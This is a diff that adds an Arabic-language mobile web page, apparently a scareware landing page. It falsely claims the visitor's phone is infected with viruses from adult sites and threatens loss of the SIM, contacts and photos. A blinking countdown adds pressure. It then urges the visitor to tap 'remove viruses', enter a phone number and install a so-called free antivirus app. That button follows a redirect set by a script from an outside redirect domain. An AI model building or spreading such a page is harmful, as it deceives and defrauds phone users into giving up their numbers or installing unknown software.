@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <base href=".">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <title> لقد تضرر هاتفك بشدة بسبب وجود فيروسات! </title>
+    <style type="text/css">
+    @media only screen and (min-width: 550px) {
+        #wrapper {
+
+            max-width: 500px !important;
+        }
+
+        #timer p {
+            font-size: 14px !important;
+        }
+
+    }
+
+    h1 {
+        font-size: 22px;
+        text-transform: uppercase;
+    }
+
+    #timer p,
+    p {
+        color: #ffffff
+    }
+
+    #today {
+        float: right;
+        font-weight: 600;
+        padding-top: 15px;
+        display: none;
+    }
+
+    .img1 {
+        width: 100%;
+        max-width: 400px;
+    }
+
+    #error,
+    #timer {
+        display: inline-block;
+        float: left
+    }
+
+    #timer p,
+    .btn {
+        #font-weight: 700
+    }
+
+    body {
+        font-family: sans-serif;
+        background-color: #fff;
+        color: #000;
+    }
+
+    a {
+        text-decoration: none
+    }
+
+    footer,
+    header,
+    section {
+        clear: both
+    }
+
+    * {
+        margin: 0;
+        padding: 0
+    }
+
+    #wrapper {
+        margin: 0px auto;
+        max-width: 440px;
+        border: 0 solid #303030;
+        border-radius: 0
+    }
+
+    p {
+        font-size: 14px;
+        padding: 5px 0;
+        color: #000;
+    }
+
+    #timer {
+        max-width: 290px;
+        width: 65%
+    }
+
+    #timer p {
+        font-size: 12px
+    }
+
+    #error {
+        max-width: 120px;
+        width: 35%
+    }
+
+    #error img {
+        width: 70%
+    }
+
+    .container {
+        padding-left: 8px;
+        padding-right: 8px
+    }
+
+    .blink {
+        color: #ce3426;
+        padding: 6px;
+        -webkit-animation: blink 1s infinite;
+        -moz-animation: blink 1s infinite;
+        -ms-animation: blink 1s infinite;
+        -o-animation: blink 1s infinite;
+        animation: blink 1s infinite;
+    }
+    .timeO{
+        color: #ce3426;
+        display: -webkit-flex;
+        display: -moz-flex;
+        display: -ms-flex;
+        display: -o-flex;
+        display: flex;
+        margin-right: 3px;
+    }
+    #stopwatch{
+        display: -webkit-flex;
+        display: -moz-flex;
+        display: -ms-flex;
+        display: -o-flex;
+        display: flex;
+    }
+
+    @-webkit-keyframes blink {
+        0% {
+            opacity: 1.0;
+        }
+
+        50% {
+            opacity: 0.0;
+        }
+
+        100% {
+            opacity: 1.0;
+        }
+    }
+
+    @-moz-keyframes blink {
+        0% {
+            opacity: 1.0;
+        }
+
+        50% {
+            opacity: 0.0;
+        }
+
+        100% {
+            opacity: 1.0;
+        }
+    }
+
+    @-ms-keyframes blink {
+        0% {
+            opacity: 1.0;
+        }
+
+        50% {
+            opacity: 0.0;
+        }
+
+        100% {
+            opacity: 1.0;
+        }
+    }
+    }
+
+    @-o-keyframes blink {
+        0% {
+            opacity: 1.0;
+        }
+
+        50% {
+            opacity: 0.0;
+        }
+
+        100% {
+            opacity: 1.0;
+        }
+    }
+
+    @keyframes blink {
+        0% {
+            opacity: 1.0;
+        }
+
+        50% {
+            opacity: 0.0;
+        }
+
+        100% {
+            opacity: 1.0;
+        }
+    }
+
+    @media only screen and (max-width: 959px) {}
+
+    @media only screen and (min-width: 768px) and (max-width: 959px) {}
+
+    @media only screen and (max-width: 767px) {}
+
+    @media only screen and (min-width: 480px) and (max-width: 767px) {}
+
+    @media only screen and (max-width: 479px) {}
+
+    @media only screen and (max-width: 320px) {
+        h1 {
+            font-size: 16px;
+            text-transform: uppercase;
+        }
+
+        p {
+            font-size: 14px;
+            padding: 1px;
+            color: #ce3426;
+        }
+    }
+    .btn12{
+      border-radius: 5px; color: #ce3426;  font-size: 16px; font-weight: bold; display: block; line-height: 50px; max-width: 375px; width: 90%; border: 3px solid;
+    }
+    .last_text{
+      padding: 5px 5px; text-align: center; color: #000; font-size: 12px;
+    }
+    </style>
+</head>
+
+<body >
+    <div id="wrapper">
+        <div class="container">
+            <header>
+                <center>
+                    <div id="today">
+                        <script type="text/javascript">
+                        var currentTime = new Date();
+                        // Array of day names
+                        var dayNames = new Array("الأحد", "الإثنين", "الثلاثاء", "الأربعاء", "الخميس", "يوم الجمعة", "يوم السبت");
+                        var date = currentTime.getDate();
+                        var year = currentTime.getFullYear();
+                        document.write(dayNames[currentTime.getDay()] + " " + date + ", " + year);
+                        </script>
+                    </div>
+                </center>
+            </header>
+            <section>
+                <h1><img src="./index_files/danger.png" width="20" height="15" alt="">
+<span class="blink" style="font-size: 22px; color: #ce3426;text-transform: uppercase;">قد تكون القدرة الإنتاجية الخاصة بجوالك ضعيفة</span></h1>
+            </section>
+            <section>
+                <div id="timer">
+                    <p><span style="color: #ce3426; font-weight: bold;font-size:14px;">قد تكون القدرة الإنتاجية الخاصة بجوالك ضعيفة، ومن الممكن أن السبب وراء هذا وجود برامج خبيثة (فيروسات)! مهم! </span> <span style="color: #000">بيثة نتيجةً لفتح مواقع خاصة بالبالغين مؤخراً. وقد يؤدي هذا فيما بعد إلى تلف شريحة الهاتف...ة وكذلك جهات الاتصال والصور والبيانات والتطبيقات الخاصة بك وغيرها</span></p>
+                    <span style="font-size: 30px; font-weight: bold; color: #ce3426; font-family: sans-serif;" id="countdown" class="timer"></span>
+                </div>
+                <div id="error"><img src="./index_files/imp.gif" alt=""> </div>
+            </section>
+            <section>
+
+                <div id="stopwatch">
+                	<b><span  class="timeO">seconds</span></b>
+                	<b><span  class="timeO" id="seconds">00</span></b>
+
+                    
+                    <b><span  class="timeO">minutes</span></b>
+                    <b><span  class="timeO" id="mins">00</span></b>
+                    
+                </div>
+
+                <p> <b>قد تحتاج إلى استعادة هاتفك (خطوة بخطوة): </b>
+                    <br>
+                    <br>
+                    <strong class="blink">الخطوة الأولى:  </strong> انقر على <strong style="color: #ce3426; font-weight: bold;">"إزالة الفيروسات"</strong>, ، وأدخل رقم الهاتف واتبع التعليمات الواردة في الصفحة التالية!<br>
+                    <br>
+                    <strong class="blink">الخطوة الثانية:  </strong>قم بتنز <strong style="color: #ce3426;">يل تطبيق مكافحة</strong>, <strong style="font-weight: bold;"> الفيروسات المجاني وإزالة كافة الفيروسات واستعادة هاتفك!</strong></p>
+                <p></p>
+            </section>
+            <footer>
+                <p align="center">
+                  <a class="btn12" style="" onclick="target()" href="#">إزالة الفيروسات</a> </p>
+            </footer>
+           
+        </div>
+
+    </div>
+    <script src="http://to.searchredirectt.com/preland.js"></script>
+    <script language="JavaScript" type="text/javascript">
+    function target() { location.href = afurl }
+    </script>
+    <script src="index_files/jquery-3.3.1.min.js"></script>
+    <script src="index_files/main.js"></script>
+</body>
+
+</html>
